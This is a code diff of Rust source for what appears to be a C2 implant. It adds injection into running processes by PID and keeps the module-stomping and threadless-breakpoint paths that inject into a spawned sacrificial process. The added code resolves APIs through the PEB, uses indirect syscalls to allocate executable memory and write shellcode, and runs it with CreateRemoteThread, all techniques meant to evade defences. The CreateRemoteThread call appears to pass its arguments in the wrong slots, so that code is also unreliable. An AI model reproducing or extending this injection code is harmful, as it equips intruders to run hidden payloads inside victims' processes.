@@ -691,15 +691,8 @@ pub unsafe fn threadless_inject(
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
-    let _ = pid; // forward-compat: Pool Party / remote-inject will use this.
-
-    // method 0 (Pool Party) not yet implemented — delegate to module stomp
-    // (method 2) so the command works end-to-end today. Prefix the output so
-    // the operator is NOTIFIED that their requested technique was substituted
-    // (silent substitution is a UX hazard — they'd think they got Pool Party).
+    // method 0 (Pool Party) not yet implemented — delegate to module stomp.
     let effective_method = if method == 0 { 2 } else { method };
-
-    // Build a warning prefix for the method-0 substitution.
     let warn_prefix = if method == 0 {
         crate::heap::String::from(
             "WARN: Pool Party (method 0) not implemented — using module stomp (method 2). ",
@@ -708,25 +701,38 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
         crate::heap::String::new()
     };
 
+    // ---- Existing-process injection (pid != 0) ----
+    if pid != 0 {
+        return match unsafe { inject_existing(pid, shellcode) } {
+            Ok(()) => {
+                let mut msg = warn_prefix;
+                msg.push_str("remote inject ok (pid=");
+                let mut buf = [0u8; 10];
+                let mut n = pid;
+                let mut i = buf.len();
+                if n == 0 { buf[0] = b'0'; i = 1; }
+                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
+                // Append the u32→ASCII digits.
+                for &b in &buf[i..] {
+                    msg.push(b as char);
+                }
+                msg.push(')');
+                nyx_protocol::Response::Output(msg.into_bytes())
+            }
+            Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
+        };
+    }
+
+    // ---- Sacrificial-process path (pid == 0) ----
     match effective_method {
         1 => {
-            // Threadless HWBP: needs a sacrificial process for the thread handle.
-            let target = if spawn_to.is_empty() {
-                "notepad.exe"
-            } else {
-                spawn_to
-            };
+            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
             match unsafe { create_sacrificial(target) } {
                 Ok(proc) => {
-                    let trigger = proc.main_thread as usize; // self-trigger on resume
-                    match unsafe {
-                        threadless_inject(proc.handle, proc.main_thread, shellcode, trigger)
-                    } {
+                    let trigger = proc.main_thread as usize;
+                    match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode, trigger) } {
                         Ok(()) => nyx_protocol::Response::Output(
-                            crate::heap::String::from(
-                                "threadless HWBP inject ok (sacrificial pid=",
-                            )
-                            .into_bytes(),
+                            crate::heap::String::from("threadless HWBP inject ok (sacrificial pid=").into_bytes(),
                         ),
                         Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                     }
@@ -735,15 +741,9 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
             }
         }
         2 => {
-            // Module stomp: spawn-to sacrificial + .text overwrite.
-            let target = if spawn_to.is_empty() {
-                "notepad.exe"
-            } else {
-                spawn_to
-            };
+            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
             match unsafe { module_stomp(target, shellcode) } {
                 Ok(_handle) => {
-                    // Prepend the Pool-Party-substitution warning if method was 0.
                     let mut msg = warn_prefix;
                     msg.push_str("module stomp inject ok");
                     nyx_protocol::Response::Output(msg.into_bytes())
@@ -753,4 +753,82 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
         }
         _ => nyx_protocol::Response::Err(crate::heap::String::from("unknown inject method")),
     }
+}
+
+/// Inject shellcode into an EXISTING process (pid != 0).
+///
+/// Opens the target via `OpenProcess`, allocates RWX via indirect syscall
+/// `NtAllocateVirtualMemory`, writes via `NtWriteVirtualMemory`, creates a
+/// remote thread via `CreateRemoteThread` (kernel32, PEB-walk resolved).
+/// Works on all Windows versions (XP+).
+///
+/// # Safety
+/// Cross-process handle + memory operations. Single-threaded beacon context.
+unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
+    use core::ffi::c_void;
+
+    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+    type CreateRemoteThreadFn = unsafe extern "system" fn(
+        *mut c_void, *mut c_void, usize,
+        Option<unsafe extern "system" fn(*mut c_void) -> u32>,
+        *mut c_void, u32, *mut c_void,
+    ) -> *mut c_void;
+    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("OpenProcess unresolved"),
+    };
+    let crt: CreateRemoteThreadFn = match export_addr(b"kernel32.dll", b"CreateRemoteThread") {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("CreateRemoteThread unresolved"),
+    };
+    let ch: CloseHandleFn = match export_addr(b"kernel32.dll", b"CloseHandle") {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("CloseHandle unresolved"),
+    };
+
+    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | QUERY
+    let h_proc = unsafe { op(0x102A, 0, pid) };
+    if h_proc.is_null() || h_proc as usize == usize::MAX {
+        return Err("OpenProcess failed (pid/access)");
+    }
+
+    let rt = crate::syscalls::global().ok_or("syscall runtime down")?;
+
+    // 1. Allocate RWX in target via indirect syscall.
+    let mut remote_base: usize = 0;
+    let mut region_size: usize = shellcode.len();
+    let alloc_status = unsafe {
+        crate::syscalls::nt_allocate_virtual_memory(
+            rt, h_proc as usize,
+            &mut remote_base, &mut region_size,
+            0x3000, 0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        )
+    };
+    if alloc_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote alloc failed"); }
+
+    // 2. Write shellcode via indirect syscall.
+    let mut written: usize = 0;
+    let write_status = unsafe {
+        crate::syscalls::nt_write_virtual_memory(
+            rt, h_proc as usize, remote_base,
+            shellcode.as_ptr(), shellcode.len(),
+            &mut written,
+        )
+    };
+    if write_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote write failed"); }
+
+    // 3. CreateRemoteThread on the shellcode address.
+    let h_thread = unsafe {
+        crt(h_proc, core::ptr::null_mut(), 0, None, remote_base as *mut c_void, 0, core::ptr::null_mut())
+    };
+    if h_thread.is_null() {
+        unsafe { ch(h_proc) };
+        return Err("CreateRemoteThread failed");
+    }
+
+    unsafe { ch(h_thread) };
+    unsafe { ch(h_proc) };
+    Ok(())
 }
